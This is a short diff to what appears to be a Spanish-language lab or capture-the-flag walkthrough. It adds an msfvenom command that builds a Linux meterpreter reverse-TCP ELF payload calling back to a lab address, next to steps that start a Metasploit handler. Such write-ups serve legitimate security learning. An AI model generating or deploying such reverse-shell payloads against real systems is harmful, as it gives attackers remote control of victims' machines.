@@ -873,6 +873,7 @@ En una abrimos el msfconsole:
 ```
 msfconsole
 ```
+msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.11.48.207 lport=1234 -f elf -o origen_shell_prueba
 
 ```
 use exploit/multi/handler
